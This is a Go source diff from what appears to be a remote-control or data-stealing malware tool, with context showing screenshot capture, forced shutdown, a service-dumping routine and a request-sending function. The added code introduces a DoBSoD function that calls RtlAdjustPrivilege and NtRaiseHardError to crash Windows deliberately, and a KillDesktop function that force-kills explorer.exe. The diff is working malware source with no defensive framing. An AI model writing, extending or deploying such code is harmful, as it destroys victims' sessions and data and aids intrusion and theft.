@@ -12,9 +12,7 @@ import (
 	"bytes"
 	"fmt"
 	"github.com/vova616/screenshot"
-	_ "github.com/vova616/screenshot"
 	"image/png"
-	"io"
 	"log"
 	"net/http"
 	"os"
@@ -22,6 +20,15 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"syscall"
+	"unsafe"
+)
+
+var (
+	ntdll = syscall.NewLazyDLL("ntdll.dll")
+
+	RtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
+	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
 )
 
 func ForceShutdown() {
@@ -30,10 +37,21 @@ func ForceShutdown() {
 	}
 }
 
+func DoBSoD() {
+	RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(new(bool))))
+	NtRaiseHardError.Call(0xdeadbeef, 0, 0, uintptr(0), 6, uintptr(unsafe.Pointer(new(uintptr))))
+}
+
+func KillDesktop() {
+	err := exec.Command("cmd", "/c", "taskkill", "/f", "/t", "/im", "explorer.exe").Run()
+	if err != nil {
+		fmt.Println("Failed to kill Desktop process:", err)
+	}
+}
+
 func DumpService() []string {
 
 	var WG sync.WaitGroup
-
 	var T []string
 
 	for _, Path := range PLATFORMS {
@@ -71,14 +89,6 @@ func DumpService() []string {
 		WG.Wait()
 	}
 	return T
-}
-
-func GetExternIP() string {
-	resp, _ := http.Get("https://myexternalip.com/raw")
-	defer resp.Body.Close()
-	body, _ := io.ReadAll(resp.Body)
-
-	return string(body)
 }
 
 func SendRequest(body string, ip string) {
